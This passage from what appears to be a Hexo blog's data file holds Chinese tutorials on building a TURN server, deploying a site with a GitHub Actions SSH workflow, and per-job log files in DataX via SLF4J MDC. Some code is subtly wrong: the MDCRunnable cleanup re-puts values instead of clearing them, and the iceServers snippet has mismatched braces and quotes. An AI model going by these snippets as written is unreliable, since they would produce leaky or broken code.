quota disabled. bandwidth_per_allocation &#x3D; 1024   </span><br><span class=\"line\">##Restricted user bandwidth (in KBytes&#x2F;s). ## 0 value means bandwidth limitation disabled. restricted_bandwidth &#x3D; 0</span><br></pre></td></tr></table></figure>\n\n<p>2，认证用户文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp extra&#x2F;turnusers.txt.template &#x2F;etc&#x2F;turnusers.txt </span><br><span class=\"line\">vi &#x2F;etc&#x2F;turnusers.txt</span><br></pre></td></tr></table></figure>\n\n\n<p>添加一行或多行认证信息格式为 用户名:密码:domain:authorized 例如下面的行: 700:700pass:domain.org:authorized</p>\n<p>添加完成后，就可以在webrtc 里面使用stun 和tunserver 了。</p>\n<figure class=\"highlight plain\"><figcaption><span>configuration </span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;iceServers&#39;: [&#123; &#123; &#39;url&#39; : &#39;stun:1.2.3.4&#39;&#125; , &#123; &#39;url&#39; : ‘turn:700@1.2.3.4&#39;,credential : &#39;700pass&#39;&#125; &#125;] &#125;;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-搭建turn服务器目的\"><a href=\"#1-搭建turn服务器目的\" class=\"headerlink\" title=\"1.搭建turn服务器目的\"></a>1.搭建turn服务器目的</h3><p>部署WebRTC 或 SIP p2p 方案时经常会遇到p2p 无法穿透的环境，</p>\n<p>这时就是TunServer 的用武之地了。</p>\n<p>这里我们使用turnserver-0.7.3</p>\n<h3 id=\"2-下载confuse依赖库\"><a href=\"#2-下载confuse依赖库\" class=\"headerlink\" title=\"2.下载confuse依赖库\"></a>2.下载confuse依赖库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;savannah.nongnu.org&#x2F;download&#x2F;confuse&#x2F;confuse-2.7.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar zxvf confuse-2.7.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">cd confuse*</span><br><span class=\"line\"></span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"3-下载turnserver\"><a href=\"#3-下载turnserver\" class=\"headerlink\" title=\"3.下载turnserver\"></a>3.下载turnserver</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;downloads.sourceforge.net&#x2F;project&#x2F;turnserver&#x2F;turnserver-0.7.3.tar.bz2 </span><br><span class=\"line\">tar jxvf turnserver-0.7.3.tar.bz2</span><br><span class=\"line\"></span><br><span class=\"line\">cd turnserver*</span><br><span class=\"line\"></span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-编辑配置文件\"><a href=\"#4-编辑配置文件\" class=\"headerlink\" title=\"4.编辑配置文件\"></a>4.编辑配置文件</h3><p>将extra 中的配置文件模版拷贝到/etc目录下,假设您的ip 是 1.2.3.4</p>\n<p>1，配置文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp extra&#x2F;turnserver.conf.template &#x2F;etc&#x2F;turnserver.conf </span><br><span class=\"line\">vi &#x2F;etc&#x2F;tunserver.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改</p>\n<p>listen_address = { “1.2.3.4” }</p>\n<p>修改 ## Daemon mode. daemon = true # 修改为后台服务方式</p>\n<p>修改带宽限制</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##Allocation bandwidth limitation (in KBytes&#x2F;s). ## 0 value means bandwidth quota disabled. bandwidth_per_allocation &#x3D; 1024   </span><br><span class=\"line\">##Restricted user bandwidth (in KBytes&#x2F;s). ## 0 value means bandwidth limitation disabled. restricted_bandwidth &#x3D; 0</span><br></pre></td></tr></table></figure>\n\n<p>2，认证用户文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp extra&#x2F;turnusers.txt.template &#x2F;etc&#x2F;turnusers.txt </span><br><span class=\"line\">vi &#x2F;etc&#x2F;turnusers.txt</span><br></pre></td></tr></table></figure>\n\n\n<p>添加一行或多行认证信息格式为 用户名:密码:domain:authorized 例如下面的行: 700:700pass:domain.org:authorized</p>\n<p>添加完成后，就可以在webrtc 里面使用stun 和tunserver 了。</p>\n<figure class=\"highlight plain\"><figcaption><span>configuration </span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;iceServers&#39;: [&#123; &#123; &#39;url&#39; : &#39;stun:1.2.3.4&#39;&#125; , &#123; &#39;url&#39; : ‘turn:700@1.2.3.4&#39;,credential : &#39;700pass&#39;&#125; &#125;] &#125;;</span><br></pre></td></tr></table></figure>\n"},{"title":"hexo博客通过github的actions实现ssh自动化部署","date":"2021-09-20T03:29:35.000Z","_content":"### 自动化部署的原理\n\n1.通过每次提交代码，触发github的actions去执行我们编写的脚本。\n\n2.可通过scp的方式部署到我们的服务上去。\n\n\n### 自定义环境变量\n需要在项目下创建一下文件blank.yml，放在.github/workflows/blank.yml 这个路径下，文件内容如下图所示。\n\n``` yml\n# This is a basic workflow to help you get started with Actions\n\nname: CI\n\n# Controls when the action will run. Triggers the workflow on push or pull request\n# events but only for the master branch\non:\n  push:\n    branches: [ master ]\n\n# A workflow run is made up of one or more jobs that can run sequentially or in parallel\njobs:\n  # This workflow contains a single job called \"build\"\n  build:\n    # The type of runner that the job will run on\n    runs-on: ubuntu-latest\n\n    # Steps represent a sequence of tasks that will be executed as part of the job\n    steps:\n    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it\n    - uses: actions/checkout@v2\n\n    - name: Setup Node.js 10.x\n      uses: actions/setup-node@v1\n      with:\n        node-version: \"10.x\"\n    \n    - name: Setup Dependencies\n      run: |\n        npm install -g hexo-cli\n        npm i -g @cloudbase/cli\n        npm install\n        hexo generate\n\n    - name: Deploy to Server\n      uses: easingthemes/ssh-deploy@main\n      env:\n          SSH_PRIVATE_KEY: ${{ secrets.SERVER_SSH_KEY }}\n          ARGS: \"-rltgoDzvO --delete\"\n          SOURCE: \"public/\"\n          REMOTE_HOST: ${{ secrets.REMOTE_HOST }}\n          REMOTE_USER: ${{ secrets.REMOTE_USER }}\n          TARGET: ${{ secrets.REMOTE_TARGET }}\n```\n\n其中变量 secrets都需要根据自身的情况进行替换。替换过程参照下图即可\n\n![](/image/2012-9-20.png)\n\n\n按照上面的操作就可以替换掉。\n\n","source":"_posts/博客增加github自动部署.md","raw":"---\ntitle: hexo博客通过github的actions实现ssh自动化部署\ndate: 2021-09-20 11:29:35\ntags: github hexo\n---\n### 自动化部署的原理\n\n1.通过每次提交代码，触发github的actions去执行我们编写的脚本。\n\n2.可通过scp的方式部署到我们的服务上去。\n\n\n### 自定义环境变量\n需要在项目下创建一下文件blank.yml，放在.github/workflows/blank.yml 这个路径下，文件内容如下图所示。\n\n``` yml\n# This is a basic workflow to help you get started with Actions\n\nname: CI\n\n# Controls when the action will run. Triggers the workflow on push or pull request\n# events but only for the master branch\non:\n  push:\n    branches: [ master ]\n\n# A workflow run is made up of one or more jobs that can run sequentially or in parallel\njobs:\n  # This workflow contains a single job called \"build\"\n  build:\n    # The type of runner that the job will run on\n    runs-on: ubuntu-latest\n\n    # Steps represent a sequence of tasks that will be executed as part of the job\n    steps:\n    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it\n    - uses: actions/checkout@v2\n\n    - name: Setup Node.js 10.x\n      uses: actions/setup-node@v1\n      with:\n        node-version: \"10.x\"\n    \n    - name: Setup Dependencies\n      run: |\n        npm install -g hexo-cli\n        npm i -g @cloudbase/cli\n        npm install\n        hexo generate\n\n    - name: Deploy to Server\n      uses: easingthemes/ssh-deploy@main\n      env:\n          SSH_PRIVATE_KEY: ${{ secrets.SERVER_SSH_KEY }}\n          ARGS: \"-rltgoDzvO --delete\"\n          SOURCE: \"public/\"\n          REMOTE_HOST: ${{ secrets.REMOTE_HOST }}\n          REMOTE_USER: ${{ secrets.REMOTE_USER }}\n          TARGET: ${{ secrets.REMOTE_TARGET }}\n```\n\n其中变量 secrets都需要根据自身的情况进行替换。替换过程参照下图即可\n\n![](/image/2012-9-20.png)\n\n\n按照上面的操作就可以替换掉。\n\n","slug":"博客增加github自动部署","published":1,"updated":"2021-09-20T14:10:18.175Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktx054el0000qj72duacfvpc","content":"<h3 id=\"自动化部署的原理\"><a href=\"#自动化部署的原理\" class=\"headerlink\" title=\"自动化部署的原理\"></a>自动化部署的原理</h3><p>1.通过每次提交代码，触发github的actions去执行我们编写的脚本。</p>\n<p>2.可通过scp的方式部署到我们的服务上去。</p>\n<h3 id=\"自定义环境变量\"><a href=\"#自定义环境变量\" class=\"headerlink\" title=\"自定义环境变量\"></a>自定义环境变量</h3><p>需要在项目下创建一下文件blank.yml，放在.github/workflows/blank.yml 这个路径下，文件内容如下图所示。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This is a basic workflow to help you get started with Actions</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">CI</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Controls when the action will run. Triggers the workflow on push or pull request</span></span><br><span class=\"line\"><span class=\"comment\"># events but only for the master branch</span></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> <span class=\"string\">[</span> <span class=\"string\">master</span> <span class=\"string\">]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"comment\"># This workflow contains a single job called \"build\"</span></span><br><span class=\"line\">  <span class=\"attr\">build:</span></span><br><span class=\"line\">    <span class=\"comment\"># The type of runner that the job will run on</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Steps represent a sequence of tasks that will be executed as part of the job</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">    <span class=\"comment\"># Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node.js</span> <span class=\"number\">10.</span><span class=\"string\">x</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">node-version:</span> <span class=\"string\">\"10.x\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Dependencies</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">hexo-cli</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">i</span> <span class=\"string\">-g</span> <span class=\"string\">@cloudbase/cli</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">generate</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">to</span> <span class=\"string\">Server</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">easingthemes/ssh-deploy@main</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">SSH_PRIVATE_KEY:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.SERVER_SSH_KEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">ARGS:</span> <span class=\"string\">\"-rltgoDzvO --delete\"</span></span><br><span class=\"line\">          <span class=\"attr\">SOURCE:</span> <span class=\"string\">\"public/\"</span></span><br><span class=\"line\">          <span class=\"attr\">REMOTE_HOST:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_HOST</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">REMOTE_USER:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_USER</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">TARGET:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_TARGET</span> <span class=\"string\">&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中变量 secrets都需要根据自身的情况进行替换。替换过程参照下图即可</p>\n<p><img src=\"/image/2012-9-20.png\" alt=\"\"></p>\n<p>按照上面的操作就可以替换掉。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"自动化部署的原理\"><a href=\"#自动化部署的原理\" class=\"headerlink\" title=\"自动化部署的原理\"></a>自动化部署的原理</h3><p>1.通过每次提交代码，触发github的actions去执行我们编写的脚本。</p>\n<p>2.可通过scp的方式部署到我们的服务上去。</p>\n<h3 id=\"自定义环境变量\"><a href=\"#自定义环境变量\" class=\"headerlink\" title=\"自定义环境变量\"></a>自定义环境变量</h3><p>需要在项目下创建一下文件blank.yml，放在.github/workflows/blank.yml 这个路径下，文件内容如下图所示。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This is a basic workflow to help you get started with Actions</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">CI</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Controls when the action will run. Triggers the workflow on push or pull request</span></span><br><span class=\"line\"><span class=\"comment\"># events but only for the master branch</span></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> <span class=\"string\">[</span> <span class=\"string\">master</span> <span class=\"string\">]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"comment\"># This workflow contains a single job called \"build\"</span></span><br><span class=\"line\">  <span class=\"attr\">build:</span></span><br><span class=\"line\">    <span class=\"comment\"># The type of runner that the job will run on</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Steps represent a sequence of tasks that will be executed as part of the job</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">    <span class=\"comment\"># Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node.js</span> <span class=\"number\">10.</span><span class=\"string\">x</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">      <span class=\"attr\">with:</span></span><br><span class=\"line\">        <span class=\"attr\">node-version:</span> <span class=\"string\">\"10.x\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Dependencies</span></span><br><span class=\"line\">      <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">hexo-cli</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">i</span> <span class=\"string\">-g</span> <span class=\"string\">@cloudbase/cli</span></span><br><span class=\"line\">        <span class=\"string\">npm</span> <span class=\"string\">install</span></span><br><span class=\"line\">        <span class=\"string\">hexo</span> <span class=\"string\">generate</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Deploy</span> <span class=\"string\">to</span> <span class=\"string\">Server</span></span><br><span class=\"line\">      <span class=\"attr\">uses:</span> <span class=\"string\">easingthemes/ssh-deploy@main</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">SSH_PRIVATE_KEY:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.SERVER_SSH_KEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">ARGS:</span> <span class=\"string\">\"-rltgoDzvO --delete\"</span></span><br><span class=\"line\">          <span class=\"attr\">SOURCE:</span> <span class=\"string\">\"public/\"</span></span><br><span class=\"line\">          <span class=\"attr\">REMOTE_HOST:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_HOST</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">REMOTE_USER:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_USER</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\">          <span class=\"attr\">TARGET:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.REMOTE_TARGET</span> <span class=\"string\">&#125;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中变量 secrets都需要根据自身的情况进行替换。替换过程参照下图即可</p>\n<p><img src=\"/image/2012-9-20.png\" alt=\"\"></p>\n<p>按照上面的操作就可以替换掉。</p>\n"},{"title":"datax集成spring boot后实现每个job打印到不同文件","date":"2021-06-14T03:29:35.000Z","_content":"### 问题背景\n\n1.当我们的程序开启了多个线程进行作业的时候，如何把跟一个作业相关的日志都打印到一个文件呢，而不是都打印在一个文件里，毕竟都打印在一个文件里，很不方便我们日常去查看问题。\n\n2.经过调研发现slfj的MDC就可以实现这个功能，原理就是通过threalocal去实现的，感兴趣的可以去查看源码。\n\n### 解决方法\n\n1.具体怎么使用也很简单，我们需要在datax的线程池执行任务的时候，能够获取到启动这个线程池传递过来的jobId就可以了，具体代码如下。\n```java\npackage com.alibaba.datax.core.util;\n\nimport org.slf4j.MDC;\n\nimport java.util.Map;\nimport java.util.concurrent.*;\n\npublic class MDCThreadPoolExecutor extends ThreadPoolExecutor {\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, RejectedExecutionHandler handler) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);\n    }\n\n    @Override\n    public void execute(Runnable command) {\n        final Map<String, String> context = MDC.getCopyOfContextMap();\n        super.execute(new Runnable() {\n            @Override\n            public void run() {\n                // 将父线程的MDC内容传给子线程\n                MDC.setContextMap(context);\n                try {\n                    // 执行异步操作\n                    command.run();\n                } finally {\n                    // 清空MDC内容\n                    MDC.clear();\n                }\n            }\n        });\n    }\n}\n\n```\n\n```java\npackage com.alibaba.datax.core.util;\n\nimport org.slf4j.MDC;\n\nimport java.util.Map;\n\npublic class MDCRunnable implements Runnable {\n    private Runnable runnable;\n    /**\n     * 保存当前主线程的MDC值\n     */\n    private final Map<String, String> mainMdcMap;\n\n    public MDCRunnable(Runnable runnable) {\n        this.runnable = runnable;\n        this.mainMdcMap = MDC.getCopyOfContextMap();\n    }\n\n\n    @Override\n    public void run() {\n        // 将父线程的MDC值赋给子线程\n        for (Map.Entry<String, String> entry : mainMdcMap.entrySet()) {\n            MDC.put(entry.getKey(), entry.getValue());\n        }\n        // 执行被装饰的线程run方法\n        runnable.run();\n        // 执行结束移除MDC值\n        for (Map.Entry<String, String> entry : mainMdcMap.entrySet()) {\n            MDC.put(entry.getKey(), entry.getValue());\n        }\n    }\n}\n\n```\n通过上述对线程池进行改造，在线程池每次获取任务的时候，都可以从父线程获取父线程设置的变量。因此我们要在父线程启动子线程的时候，设置上这个变量。\n```java\nMDC.put(\"jobId\", String.valueOf(jobId));\n\n```\n\n接下来，我们需要配置下logback.xml\n```xml\n\n    <appender name=\"siftInfo\" class=\"ch.qos.logback.classic.sift.SiftingAppender\">\n        <!--discriminator鉴别器，设置运行时动态属性,siftingAppender根据这个属性来输出日志到不同文件 -->\n        <discriminator>\n            <key>jobId</key>\n            <defaultValue>unknown</defaultValue>\n        </discriminator>\n        <sift>\n            <!--具体的写日志appender，每一个userId创建一个文件-->\n            <appender name=\"${jobId}\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n                <append>true</append>\n                <encoder charset=\"UTF-8\">\n                    <pattern>%d{yyyy-MM-dd HH:mm:ss} %level %logger{36} - %msg%n</pattern>\n                </encoder>\n\n                <file>${logdir}/job/${jobId}.log</file>\n                <rollingPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\">\n                    <!--定义文件滚动时的文件名的格式-->\n                    <fileNamePattern>./logs/job/%d{yyyyMMdd}/${jobId}-%i.log</fileNamePattern>\n                    <maxFileSize>500MB</maxFileSize>\n                    <maxHistory>60</maxHistory>\n                    <totalSizeCap>20GB</totalSizeCap>\n                </rollingPolicy>\n\n                <filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n                    <level>INFO</level>\n                </filter>\n            </appender>\n        </sift>\n    </appender>\n\n```\n","source":"_posts/datax集成spring-boot实现每个job的日志打印到不同文件.md","raw":"---\ntitle: datax集成spring boot后实现每个job打印到不同文件\ndate: 2021-06-14 11:29:35\ntags: datax\n---\n### 问题背景\n\n1.当我们的程序开启了多个线程进行作业的时候，如何把跟一个作业相关的日志都打印到一个文件呢，而不是都打印在一个文件里，毕竟都打印在一个文件里，很不方便我们日常去查看问题。\n\n2.经过调研发现slfj的MDC就可以实现这个功能，原理就是通过threalocal去实现的，感兴趣的可以去查看源码。\n\n### 解决方法\n\n1.具体怎么使用也很简单，我们需要在datax的线程池执行任务的时候，能够获取到启动这个线程池传递过来的jobId就可以了，具体代码如下。\n```java\npackage com.alibaba.datax.core.util;\n\nimport org.slf4j.MDC;\n\nimport java.util.Map;\nimport java.util.concurrent.*;\n\npublic class MDCThreadPoolExecutor extends ThreadPoolExecutor {\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, RejectedExecutionHandler handler) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);\n    }\n\n    public MDCThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {\n        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);\n    }\n\n    @Override\n    public void execute(Runnable command) {\n        final Map<String, String> context = MDC.getCopyOfContextMap();\n        super.execute(new Runnable() {\n            @Override\n            public void run() {\n                // 将父线程的MDC内容传给子线程\n                MDC.setContextMap(context);\n                try {\n                    // 执行异步操作\n                    command.run();\n                } finally {\n                    // 清空MDC内容\n                    MDC.clear();\n                }\n            }\n        });\n    }\n}\n\n```\n\n```java\npackage com.alibaba.datax.core.util;\n\nimport org.slf4j.MDC;\n\nimport java.util.Map;\n\npublic class MDCRunnable implements Runnable {\n    private Runnable runnable;\n    /**\n     * 保存当前主线程的MDC值\n     */\n    private final Map<String, String> mainMdcMap;\n\n    public MDCRunnable(Runnable runnable) {\n        this.runnable = runnable;\n        this.mainMdcMap = MDC.getCopyOfContextMap();\n    }\n\n\n    @Override\n    public void run() {\n        // 将父线程的MDC值赋给子线程\n        for (Map.Entry<String, String> entry : mainMdcMap.entrySet()) {\n            MDC.put(entry.getKey(), entry.getValue());\n        }\n        // 执行被装饰的线程run方法\n        runnable.run();\n        // 执行结束移除MDC值\n        for (Map.Entry<String, String> entry : mainMdcMap.entrySet()) {\n            